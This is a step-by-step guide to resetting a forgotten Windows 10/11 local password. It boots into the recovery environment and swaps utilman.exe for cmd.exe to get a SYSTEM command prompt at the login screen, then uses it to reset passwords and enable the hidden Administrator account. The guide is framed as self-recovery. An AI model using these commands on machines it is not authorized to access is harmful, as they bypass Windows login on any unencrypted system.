# A Windows 10/11 Password Reset Method abusing utilman.exe


###  Context

- **Operating system:** Windows 10/11  
- **Situation:** The local account password has been forgotten 
- **Objective:** Reset the password without using 3rd party software  
- **Method:** Abuse **WinRE** and replace `utilman.exe` with `cmd.exe` to gain access to Command Prompt directly from the login screen.  

### What is WinRE?
- WinRE stands for Windows Recovery Environment
It is a built-in recovery environment included with Windows
It usually resides on a hidden recovery partition (the drive letter you see in recovery can vary)
WinRE provides troubleshooting tools such as Startup Repair, System Restore, and Command Prompt

When you open Command Prompt in WinRE, it typically starts in:

  ```
  X:\Windows\System32
  ```

This X: drive is a temporary RAM-based environment, not your main installed Windows partition.


### What is `utilman.exe`?

`utilman.exe` is the Windows **Utility Manager**, an accessibility component that can be launched directly from the sign-in screen. Its purpose is to provide access to assistive features before a user logs in.

Because it is available prior to authentication, it runs in a highly trusted system context.



### High Level Workflow


- At the login screen, Windows allows certain accessibility tools (like Narrator or On-Screen Keyboard) to run with SYSTEM privileges.

- Commands run as SYSTEM can access any file, modify any configuration, and reset any user password.

- By temporarily replacing `utilman.exe` (Utility Manager) with `cmd.exe` (Command Line), we can force Windows into running a SYSTEM-level Command Prompt when you press the Ease of Access button.




---

## Step-by-Step Guide

### 1. Enter Windows Recovery Environment (WinRE)
Two ways to access WinRE:

- **From the login screen**:  
  Hold **Shift** → click **Power → Restart**.

- **From boot**:  
  Press **F11** or **F8** (depending on manufacturer).

Then navigate to:  
```
Troubleshoot → Advanced options → Command Prompt
```

When the prompt shows:
```
X:\Windows\System32
```
you are in WinRE.



### 2. Identify the Windows Partition
Run:
```cmd
diskpart
list volume
exit
```

**Example output:**
```
DISKPART> list volume

  Volume ###  Bst  Bezeichnung  DS     Typ         Größe    Status     Info
  ----------  ---  -----------  -----  ----------  -------  ---------  --------
  Volume 0     C   Windows      NTFS   Partition    474 GB  Fehlerfre  Startpar
  Volume 1         SYSTEM       FAT32  Partition    260 MB  Fehlerfre  System
  Volume 2         WinRE_DRV    NTFS   Partition   2000 MB  Fehlerfre  Versteck


```

**Interpretation:**
- `C:` (474 GB, NTFS) → Installed Windows  
- Volume 1 (100 MB, System) → Boot partition  
- Volume 2 (2000 MB, Hidden) → Recovery (WinRE itself)  



### 3. Backup and Replace `utilman.exe`

Create a backup the original file:

```cmd
copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.exe.bak
```

Replace it with Command Prompt:
```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```



### 4. Reboot Windows

```cmd
wpeutil reboot
```
or
```cmd
shutdown /r /t 0
```


### 5. Open Command Prompt at Login
- At the login screen, click the **Ease of Access** icon (bottom-right).  
- Instead of Utility Manager, `cmd.exe` opens with SYSTEM privileges.

---

### 6. List Accounts, Reset Password, enable hidden Administrator (optional)

List accounts:
```cmd
net user
```

**Example output:**
```
Administrator  DefaultAccount  Guest
Alex           WDAGUtilityAccount
```

**Reset the password:**
```cmd
net user Alex <new-password>
```

**Enable hidden Administrator account:**

Type the following command and press Enter:
```cmd
net user administrator /active:yes
```


#### Log In
- Close CMD with `exit`.
- The "Administrator" account will now appear in the bottom-left corner. Log in without a password.  
- Enter the new password for your account (e.g., `Alex`). 

---

### 7. Restore Security

Once logged into Windows:

1. Open CMD as Administrator.  
2. Restore the original file:
```cmd
copy /y C:\Windows\System32\utilman.exe.bak C:\Windows\System32\utilman.exe
```
3. (Optional) Disable the hidden Administrator account:
```cmd
net user Administrator /active:no
```



### Troubleshooting: "Access is denied"

When restoring, you might see:
```
Access is denied.
0 file(s) copied.
```

Fix by taking ownership and resetting permissions:

```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant administrators:F
copy /y C:\Windows\System32\utilman.exe.bak C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /setowner "NT SERVICE\TrustedInstaller"
```
